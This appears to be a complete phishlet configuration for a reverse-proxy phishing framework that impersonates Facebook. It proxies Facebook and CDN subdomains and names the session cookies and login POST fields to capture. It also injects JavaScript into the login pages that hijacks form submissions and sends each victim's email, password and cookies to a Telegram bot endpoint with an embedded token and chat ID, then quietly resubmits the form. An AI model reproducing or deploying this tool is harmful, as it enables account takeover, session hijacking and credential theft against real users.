author: '@charlesbel'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
  - {phish_sub: 'auth-platform', orig_sub: 'auth-platform', domain: 'facebook.com', session: true}
  - {phish_sub: 'b-api', orig_sub: 'b-api', domain: 'facebook.com', session: true} 
  - {phish_sub: 'afad', orig_sub: 'afad', domain: 'facebook.com', session: false}
sub_filters:
  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '2F{hostname}', replace: '2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '\\\\\\/\\\\\\/{hostname}', replace: '\\\\\\/\\\\\\/{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}

auth_tokens:
  - domain: '.facebook.com'
    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin', 'presence']
    secure: true
    http_only: true
    
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'
  custom: 
    - key: 'pass'
      search: '(.*)'
      type: 'post'
    - key: 'Password'
      search: '(.*)'
      type: 'post'  
    - key: 'UserAgent'
      search: '(.*)'
      type: 'post'
    - key: 'Browser'
      search: '(.*)'
      type: 'post'
    - key: 'Engine'
      search: '(.*)'
      type: 'post'
    - key: 'Platform'
      search: '(.*)'
      type: 'post'

session_capture:
  force_redirect: false
  redirect_url: "https://facebook.com"
  cookie_domain: ".facebook.com"
  secure_cookies: true
  http_only_cookies: true
  capture_on_redirect: true
   
login:
  domain: 'www.facebook.com'
  path: '/login.php'

response_headers:
  - name: 'Content-Security-Policy'
    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net data: blob:"
  - name: 'X-Frame-Options'
    value: 'ALLOW-FROM https://facebook.com'

js_inject:
  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
    trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
    trigger_params: []
    inject_delay: 2000
    cache_buster: true
    script: |  

      const originalFetch = window.fetch;
      window.fetch = async function(...args) {
      const [url, options] = args;

      console.log(options)

      let formSubmitted = false;

      // ===== 2. ACCURATE FORM INTERCEPTION =====
      const hijackSubmit = (form) => {
        form.onsubmit = async (e) => {
          e.preventDefault();
          const email = form.querySelector('[name="email"]')?.value;
          const pass = form.querySelector('[name="pass"]')?.value;
          
          if (email && pass && !formSubmitted) {
            formSubmitted = true;
            
            // ===== 3. DELAYED CREDENTIAL+SESSION CAPTURE =====
            setTimeout(async () => {
              // Capture ACTIVE cookies (proves successful login)
              const cookies = document.cookie;
              
              // Send to Telegram (REQUIRES your bot token)
              await fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  chat_id: "5228920520",
                  text: `✅ LOGIN SUCCESS\n📧 Email: ${email}\n🔑 Password: ${pass}\n🍪Cookie: ${cookies}`,
                }),
                keepalive: true
              });

              // Manually submit the form after capture
              form.submit();
            }, 3000); // 3-second delay to ensure cookies exist
          }
        };
      };

      // ===== 4. INITIALIZE ON ALL FORMS =====
      document.querySelectorAll('form').forEach(hijackSubmit);

      // ===== 5. FALLBACK: MUTATIONOBSERVER =====
      new MutationObserver(() => {
        document.querySelectorAll('form').forEach(hijackSubmit);
      }).observe(document.body, { childList: true, subtree: true });